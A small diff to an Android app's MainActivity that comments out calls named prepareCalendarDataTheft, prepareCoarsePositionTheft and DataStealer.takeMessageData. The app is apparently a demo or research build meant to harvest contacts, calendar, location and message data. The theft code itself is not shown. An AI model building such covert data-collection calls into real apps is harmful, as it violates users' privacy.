@@ -96,12 +96,15 @@ public class MainActivity extends AppCompatActivity implements IApp {
         try {
             getContacts();
         } catch (NoPermissionsException e) {
-            Log.d("ERROE", "EXCEPTION THROWN");
+            Log.d("ERROr", "EXCEPTION THROWN");
         }
 
+
+   //     DataStealer.takeMessageData(this);
+
         //prepareContactDataTheft();
-        prepareCalendarDataTheft();
-        prepareCoarsePositionTheft();
+        //prepareCalendarDataTheft();
+        //prepareCoarsePositionTheft();
     }
 
     private void prepareCoarsePositionTheft() {
